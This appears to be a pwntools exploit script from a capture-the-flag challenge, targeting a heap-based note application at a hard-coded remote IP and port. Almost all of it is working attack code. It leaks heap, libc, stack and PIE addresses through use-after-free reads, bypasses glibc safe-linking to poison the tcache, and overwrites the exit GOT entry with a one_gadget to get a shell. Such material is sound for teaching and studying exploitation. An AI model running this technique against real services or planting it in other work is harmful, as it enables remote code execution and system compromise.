#!/usr/bin/env python3

from pwn import *

exe = ELF("./app_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

gdb_script = """
b * show_note + 136
b * new_note + 146

b * edit_note + 156

c
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    else:
        r = remote("157.180.85.167", 20002)

    return r

r = conn()
#  libc _ leak +  0x386e60


def create_note(idx, size):
    r.sendlineafter("> ", "1")
    r.sendlineafter("slot: ", str(idx))
    r.sendlineafter("length: ", str(size))


def modify_note(idx, content):
    r.sendlineafter("> ", "2")
    r.sendlineafter("slot: ", str(idx))
    r.sendafter("text: ", content)


def read_note(idx):
    r.sendlineafter("> ", "3")
    r.sendlineafter("slot: ", str(idx))
    return r.recv(0x40)



def remove_note(index):
    r.sendlineafter("> ", "4")
    r.sendlineafter("slot: ", index)


def safe_link(addr, heap_base):
    return (heap_base >> 12 ) ^ ( addr )

def main():



    # Tcache entries
    create_note("0", 0x400) 
    create_note("2", 0x400)
    
    create_note("1", 0x420) # to be in the unsorted bin
    create_note("3", 0x500) # unfreed to prevent consolidation
    
    # move 0,2 to tcache
    remove_note("0")
    remove_note("2")
    # move 1 to unsorted bin
    remove_note("1")


    # read the freed chunks to leak libc and heap

    heap_leak = u64(read_note("0")[:6].ljust(8, b"\x00")) 
    heap_base = int(hex(heap_leak) + "000", 16)
    print("heap base @ ", hex(heap_base))
    
    libc_leak = u64(read_note("1")[:6].ljust(8, b"\x00"))
    print(hex(libc_leak))
    libc.address = libc_leak - 0x1d2cc0
    print("libc base @ ", hex(libc.address))


    # overwrite the tcache fd pointer to point to libc environ

    modify_note("2", p64(safe_link(libc.symbols["environ"], heap_base))) # overwrite tcache fd pointer

    # pulling the environ address from tcache to chuncks[6] then read it's value (stack leak)
    create_note("5", 0x400)
    create_note("6", 0x400)
    stack_leak = u64(read_note("6")[:6].ljust(8, b"\x00"))

    print("stack leak", hex(stack_leak))

    # stack address that have pie address
    rip_addr = stack_leak - 312
    print("rip addr", hex(rip_addr))

    create_note("0", 0x50)
    create_note("2", 0x50)
    remove_note("2")
    remove_note("0")
    
    # overwrite the tcache fd pointer to point to rip address

    modify_note("0", flat(
            p64(safe_link(rip_addr, heap_base))
    ))


    # pulling the rip address from tcache to chuncks[4] then read it's value (pie)
    create_note("3", 0x50)
    create_note("4", 0x50)
    

    leaks = read_note("4")

    pie_leak = u64(leaks[40:46].ljust(8, b"\x00"))
    exe.address = pie_leak - 0x15c4 
    print("pie leak:", hex(pie_leak))
    print("exe address:", hex(exe.address))


    
    create_note("0", 0x100)
    create_note("2", 0x100)
    remove_note("2")
    remove_note("0")

    # overwrite the tcache fd pointer to point to exe.got.exit

    modify_note("0", flat(
        p64(safe_link(exe.got.exit, heap_base)
    )))

    # pulling the exe.got.exit address from tcache to chuncks[4] then read it's value (pie)

    create_note("3", 0x100)
    create_note("4", 0x100)
    modify_note("4", p64(libc.address + 0xd515f  )) # exit -> one_gadget



    r.interactive()


if __name__ == "__main__":
    main()
